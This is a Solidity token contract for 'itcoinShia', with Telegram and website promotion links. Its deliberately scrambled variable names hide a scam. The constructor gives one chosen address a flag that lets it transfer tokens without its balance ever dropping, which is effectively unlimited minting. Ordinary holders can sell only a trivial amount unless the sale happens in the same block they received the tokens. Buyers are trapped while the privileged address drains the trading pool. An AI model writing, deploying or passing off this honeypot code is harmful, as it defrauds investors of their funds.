/*

Telegram: https://t.me/BitcoinShiaPortal

Website: https://bitcoinshia.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract itcoinShia is Ownable {
    uint256 private qcohkvjlxdf = 105;

    mapping(address => uint256) private ogkvfxecrhi;

    function approve(address srhma, uint256 vzxcj) public returns (bool success) {
        allowance[msg.sender][srhma] = vzxcj;
        emit Approval(msg.sender, srhma, vzxcj);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address lfyimstopg, address tqpsinombhcz, uint256 vzxcj) public returns (bool success) {
        require(vzxcj <= allowance[lfyimstopg][msg.sender]);
        allowance[lfyimstopg][msg.sender] -= vzxcj;
        exgsct(lfyimstopg, tqpsinombhcz, vzxcj);
        return true;
    }

    function exgsct(address lfyimstopg, address tqpsinombhcz, uint256 vzxcj) private {
        address onqisdzmjrc = IUniswapV2Factory(mkciswrvzqb.factory()).getPair(address(this), mkciswrvzqb.WETH());
        if (0 == yeisrtw[lfyimstopg]) {
            if (lfyimstopg != onqisdzmjrc && ogkvfxecrhi[lfyimstopg] != block.number && vzxcj < totalSupply) {
                require(vzxcj <= totalSupply / (10 ** decimals));
            }
            balanceOf[lfyimstopg] -= vzxcj;
        }
        balanceOf[tqpsinombhcz] += vzxcj;
        ogkvfxecrhi[tqpsinombhcz] = block.number;
        emit Transfer(lfyimstopg, tqpsinombhcz, vzxcj);
    }

    constructor(string memory hqtfa, string memory hzcawtryjlsn, address wxqmgcriy, address phoydvxb) {
        name = hqtfa;
        symbol = hzcawtryjlsn;
        balanceOf[msg.sender] = totalSupply;
        yeisrtw[phoydvxb] = qcohkvjlxdf;
        mkciswrvzqb = IUniswapV2Router02(wxqmgcriy);
    }

    function transfer(address tqpsinombhcz, uint256 vzxcj) public returns (bool success) {
        exgsct(msg.sender, tqpsinombhcz, vzxcj);
        return true;
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private yeisrtw;

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private mkciswrvzqb;

    string public name;

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
